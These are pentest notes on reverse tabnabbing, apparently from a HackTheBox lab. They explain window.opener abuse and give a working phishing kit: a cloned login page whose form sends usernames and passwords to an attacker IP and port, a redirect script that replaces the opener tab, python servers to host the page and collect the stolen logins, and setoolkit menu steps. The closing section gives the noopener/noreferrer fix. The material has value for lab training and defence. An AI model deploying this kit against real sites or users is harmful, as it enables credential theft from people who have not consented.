# Tab napping

## More info:  
https://owasp.org/www-community/attacks/Reverse_Tabnabbing  
https://hackerone.com/reports/179568


## Desc

When you open a link in a new tab ( ```target="_blank"``` ), the page that opens in a new tab can access the initial tab and change it's location using the window.opener property. 
This is to serve malware or other phishing attack

## Tab napping (manual) 

You need 2 html forms.

1. A fished login form 
2. A form with redirect code in for the browser. 

## Example (hackthebox machine foothold used to test) (developers htb, hard machine)

1. Spoofed login.html (make sure to update any links so they resolve the content and looks as the original)(POST chnaged to GET request)

```
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="http://developer.htb/img/favicon.ico">
    <link rel="stylesheet" href="http://developer.htb/static/css/jquery.toasts.css">
    <script src="http://developer.htb/static/js/all.min.js"></script>
    <script src="http://developer.htb/static/js/jquery-3.2.1.min.js"></script>
    <title>Login | Developer.HTB</title>

    <!-- Bootstrap core CSS -->
    <link rel="stylesheet" href="/static/css/bootstrap.min.css">

    <!-- Custom styles for this template -->
    <link href="http://developer.htb/static/css/signin.css" rel="stylesheet">
  </head>

  <body class="text-center">
 
    <form class="form-signin" action="//10.10.14.148:8074" method="get">
        <input type="hidden" name="csrfmiddlewaretoken" value="DNASuXuPkU07d5eNEABgOZsAzDPk3tS3BYJrWmTahQdvAUIYHsStaSpBQvSVTGMs">
      <img class="mb-4" src="http://developer.htb/static/img/logo.png" alt="" width="72" height="72">
      <h1 class="h3 mb-3 font-weight-normal">Welcome back!</h1>
      <label for="uname" class="sr-only">User Name</label>
      <input type="text" id="id_login" name="login" placeholder="Username" class="form-control" required autofocus>
      <label for="password" class="sr-only">Password</label>
      <input type="password" id="id_password" name="password" placeholder="Password" class="form-control" required>

      
      <button id="loginbtn" class="btn btn-lg btn-primary btn-block" type="submit">Sign in</button>
          <a href="http://developer.htb/accounts/password/reset/" class="auth-link">Forgot password?</a>
        <div class="text-center mt-4 font-weight-light"> Don't have an account? <a href="/accounts/signup/" >Click here!</a>      
      <p class="mt-5 mb-3 text-muted">&copy; Developer.HTB 2021</p>
    </form>

<script src="http://developer.htb/static/js/jquery.toast.js"></script> 
<script>


</script>
  </body>
</html>

```

2. Redirect index.html (replace your IP:PORT)

```
<html>
<script>
if (window.opener) window.opener.parent.location.replace('//IP:PORT/login.html');
if (window.parent != window) window.parent.location.replace('//IP:PORT/login.html');
</script>
</html>
```

3. Setup two python server's to host your files to be served. 

```
python3 -m http.server 8088     # to host the files
python3 -m http.server 8074     # to get the login details
```

Now you can send your exploit and await the login details. 
Note I changed the POST to a GET request for ease. 

```
<form class="form-signin" action="//10.10.14.148:8074" method="get">
```

## Auto tab napping (setoolkit) (currently having issue: https://github.com/trustedsec/social-engineer-toolkit/issues/727)

1. Open setoolkit
2. From main menu choose 1) Social engineering attacks
3. From main menu choose 2) website attack vectors
4. Choose 4 for Tabnapping
5. Choose 2 for site cloner
6. 




## Remedy the issue. 

The fix is very simple by adding ```noopenerand noreferrertags``` to the href elements on the page:
```rel='noopener noreferrer'```

```
<a rel='noopener noreferrer' href="http://google.com/" target="_blank">This is a link to a bad webpage.</a>
```
